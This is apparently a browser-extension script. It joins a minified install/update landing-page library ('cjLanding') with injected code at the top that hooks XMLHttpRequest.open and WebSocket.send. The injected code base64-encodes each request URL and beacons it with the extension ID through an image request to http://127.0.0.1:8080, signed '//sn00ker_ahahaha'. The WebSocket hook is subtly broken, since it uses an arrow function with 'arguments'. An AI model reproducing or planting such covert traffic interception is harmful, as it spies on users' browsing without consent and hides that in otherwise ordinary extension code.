function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var cjLanding=function(){"use strict";function n(){var n=j.icons;return n[160]||n[80]||n[128]||n[48]||n[Object.keys(j.icons)[0]]}function t(n){var t=n.split(".");return t[0]+"."+t[1]}function e(n,t,e){var i="installed"===n?v:h;w.tabs.create({url:i.replace("[version]",t).replace("[stage]",e)})}function i(t){w.notifications.create("cj_landing_update_notification",{type:"basic",requireInteraction:!0,title:j.name+" has been updated",message:"Click to view changelog",iconUrl:n()}),w.notifications.onClicked.addListener(function(n){"cj_landing_update_notification"===n&&(e("updated",t,"0"),w.notifications.clear("cj_landing_update_notification"))})}function o(){p=y,w.storage.local.set({cj_landing_versionnumber:p})}function r(n){g=n,w.storage.local.set({cj_landing_lastupdated:g})}function a(){var n=Date.now()-g,t=864e5,e=4;return n>t?e:1+Math.floor(n/t*(e-1))}function s(){var n=t(p),i=a().toString();r(null),b.forEach(function(n){"function"==typeof n.stop&&n.stop()}),setTimeout(function(){e("updated",n,i)},2e3)}function c(){g&&C===!1&&(C=!0,b.forEach(function(n){n.init()}))}function u(){if("string"!=typeof p)return o(),m&&m("installed",p),void e("installed");var n=t(p),a=t(y);if(a!==n){if(o(),m&&m("updated",p),L)return void i(a);r(Date.now()),c()}}function d(n){var t=n.origin||"https://apps.jeurissen.co";n.websitePath&&(t+="/"+n.websitePath),v=n.installedUrl||t+"/installed",_=n.removedUrl||t+"/uninstalled",h=n.updatedUrl||t+"/updated"}function l(n){return new Promise(function(t,e){var i=n(function(n){return w.runtime.lastError?e(w.runtime.lastError):void t(n)});"object"==typeof i&&"function"==typeof i.then&&t(i)})["catch"](function(){return n()})}function f(){var n=w.storage.local.get.bind(null,["cj_landing_lastupdated","cj_landing_versionnumber"]);return l(n).then(function(n){g=n.cj_landing_lastupdated,p=n.cj_landing_versionnumber})}var p,g,v,h,_,m,b,w="undefined"!=typeof chrome&&chrome.runtime?chrome:"undefined"!=typeof browser&&browser,j=w.runtime.getManifest(),y=j.version,L=!1,C=!1;return b=[{listener:function(n){g&&n===w.windows.WINDOW_ID_NONE&&(1===a()?s():this.stop())},init:function(){w.windows.onFocusChanged.addListener(this.listener)},stop:function(){w.windows.onFocusChanged.removeListener(this.listener)}},{init:function(){g&&2===a()&&s()}},{listener:function(){if(g){var n=a();3===n?s():n>3&&this.stop()}},init:function(){w.tabs.onCreated.addListener(this.listener)},stop:function(){w.tabs.onCreated.removeListener(this.listener)}},{init:function U(){g&&4===a()&&s(),setTimeout(U,1e3)}}],function(n,t){n.useNotification&&(L=!0),m=t,d(n),f().then(function(){u(),L||c()}),w.runtime.setUninstallURL(_)}}();